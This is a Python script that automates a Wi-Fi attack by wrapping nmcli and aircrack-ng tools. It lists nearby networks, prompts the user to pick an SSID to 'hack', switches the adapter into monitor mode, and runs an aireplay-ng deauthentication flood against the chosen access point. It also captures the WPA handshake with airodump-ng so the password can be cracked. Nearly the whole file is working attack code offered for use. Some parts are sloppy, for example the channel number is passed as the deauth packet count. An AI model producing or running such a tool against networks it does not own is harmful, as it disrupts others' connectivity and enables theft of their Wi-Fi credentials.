import os
import subprocess 
counter = 0
count = 0
count2 = 0
import time
os.system("clear")
#Lists all of the wirless adapters devices
adapter_list = []
for i in range(1):
    output = subprocess.check_output("nmcli -f device device", shell=True)
    adapter = output.decode().split("/")[0].replace("DEVICE","")
    adapter_list.append([f"{i+1}. {adapter}"])
    adapter_list_words = adapter.split()
    nonumberadapter = adapter_list_words
    for j, word in enumerate(adapter_list_words):
        count = count + 1
        adapter_list_words[j] = [count,f"{word}"]
    for words in adapter_list_words:
        yeet = str(words[0]) + "."
        print(yeet,words[1])
    

# Asks the user what wifi adapter they wanna use
yes = 1
while yes == 1:
 yess = 1
 while yess == 1:
  user_input1 = input("Enter a number to select the wireless adapter you would like to use(Typicalliy wlan0): ")
  user_input1 = int(user_input1)
  if user_input1 <= len(adapter_list_words) and user_input1 > 0:
    findadapter = adapter_list_words[user_input1-1][1]
    break
  else:
    print("Invalid input. Number must be between 1 and", len(adapter_list_words))
  
  
 break
os.system("clear")
print("Now useing",findadapter)
input("Press enter to continue")
os.system("clear")

#Lists all of the ssids it can find
ssid_list = []
for i in range(1):
    output = subprocess.check_output("nmcli -f ssid,ACTIVE dev wifi list", shell=True)
    ssid = output.decode().split("/")[0].replace("no", "").replace("SSID                  ACTIVE", "").strip().replace(" ", "").replace("SSIDACTIVE","")
    ssid_list.append([f"{i+1}. {ssid}"])
    ssid_list_words = ssid.split()
    nonumberssid = ssid_list_words
    for j, word in enumerate(ssid_list_words):
        count2 = count2 + 1
        ssid_list_words[j] = [count2,f"{word}"]
    for words in ssid_list_words:
        yeet = str(words[0]) + "."
        print(yeet,words[1])
    

# Asks the user what ssid it would like to choose
yes = 1
while yes == 1:
 yess = 1
 while yess == 1:
  user_input = input("Enter a number to select the SSID you would like to hack: ")
  try:
   user_input = int(user_input)
   if user_input <= len(ssid_list_words) and user_input > 0:
    findssid = ssid_list_words[user_input-1][1]
    break
   else:
    print("Invalid input. Number must be between 1 and", len(ssid_list_words))
  except ValueError:
   print("Invalid input. Please enter a number.")
 break
os.system("clear")






#finds the bssid for the wifi the user choose
bssid_list = []
for i in range(1):
    output = subprocess.check_output("nmcli -f ssid,BSSID,ACTIVE dev wifi list", shell=True)
    ssid = output.decode().split("/")[0].replace("no", "").replace("SSID                  ACTIVE", "").strip()
    bssid_list.append([f"{i+1}. {ssid}"])
    bssid_list_words = ssid.split()
    nonumberssid = bssid_list_words
    os.system("nmcli -f ssid,BSSID,ACTIVE dev wifi list")
    bssid = bssid_list_words.index(ssid_list_words[user_input-1][1])
    findbssid = bssid_list_words[bssid+1]
    
#finds the channle for the wifi the user choose
channle_list = []
for i in range(1):
    output = subprocess.check_output("nmcli -f ssid,chan dev wifi", shell=True)
    ssid = output.decode().split("/")[0].replace("no", "").replace("SSID                  ACTIVE", "")
    channle_list.append([f"{i+1}. {ssid}"])
    channle_list_words = ssid.split()
    nonumberssid = channle_list_words
    os.system("nmcli -f ssid,chan dev wifi")
    channle = channle_list_words.index(ssid_list_words[user_input-1][1])
    findchannle = channle_list_words[channle+1]




#veryifys the output of all the setting of the wifi with the user

print("You would like to launch an Attack on:")
print("\t SSID:", findssid)
print("\t BSSID:",findbssid)
print("\t Channle:",findchannle)
running = 1
while running == 1:
 run = 1
 while run == 1:
        readdy = input("Y/N: ")
        if readdy == "Y" or readdy == "y":
         os.system("echo Running Check Kill")
         os.system("sudo airmon-ng check kill")
         os.system("")
         os.system("echo Starting Monitor mode")
         monitor = "sudo airmon-ng start "+ findadapter
         os.system(monitor)
         ddos = "sudo aireplay-ng --deauth "+findchannle+ " -a "+findbssid+" "+findadapter+"mon"
         userhandshake = "airodump-ng -w hack1 -c "+findchannle+ " --bssid " + findbssid +" "+ findadapter + "mon"
         print(userhandshake)
         handshake = "airodump-ng -w hackpass -c "+findchannle+ " --bssid " + findbssid +" "+ findadapter + "mon &"
         os.system("clear")
         print("Hack is About to Begin(Make sure your phone or wireless device is on the wifi)")
         print("Once you see HANDSHAKE CAPTURED on the top right of your screen hit ctrl c once to get the password")
         input("Press Enter to Continue")
         os.system(handshake)
         os.system(ddos)
         os.system(userhandshake)
         os.system("sudo rm hack1*")
         os.system("systemctl restart NetworkManager")
         exit()
           
         
          
          
                     
          
        elif readdy == "N" or readdy == "n":
         print("Sorry try again")
         break
        else:
         print("Invalid Input Try Aging!")
         run = 0
